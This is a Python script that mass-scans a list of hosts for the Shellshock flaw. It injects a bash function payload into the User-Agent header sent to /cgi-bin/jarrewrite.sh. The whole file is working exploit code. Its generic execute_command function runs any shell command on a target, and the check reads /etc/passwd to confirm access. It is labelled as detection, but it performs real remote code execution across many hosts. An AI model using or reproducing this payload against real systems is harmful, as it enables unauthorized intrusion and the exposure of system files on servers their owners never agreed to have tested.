#!/usr/bin/python3

'''
Author: ybdt
Date: 2021/01/27
'''

import sys
import requests
import platform

def execute_command(target, command):
    url = target + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" %(command)}
    try :
        r = requests.get(url=url, headers=headers, verify=False)
    except:
        return "";
    return r.text

def check_exploitable(target):
    #print( "(+) Testing %s for pwnability..." % (target) );
    output = execute_command(target=target, command="cat /etc/passwd");
    if "root:" in output:
        return True;
    else:
        return False;

def main():
    if len(sys.argv) != 2:
        sys.exit("Usage: python3 batch-detect.py urls.txt");
    else:
        file = sys.argv[1];
    
    with open(file, "r") as f:
        lines = f.readlines();
        for line in lines:
            if platform.system() == "Windows":
                line = line.strip("\r\n");
            elif platform.system() == "Linux":
                line = line.strip("\n");
            is_vulnerable = check_exploitable("https://" + line);
            if is_vulnerable:
                print("http://" + line + " is vulnerable");
            else:
                print("http://" + line + " is not vulnerable");

main();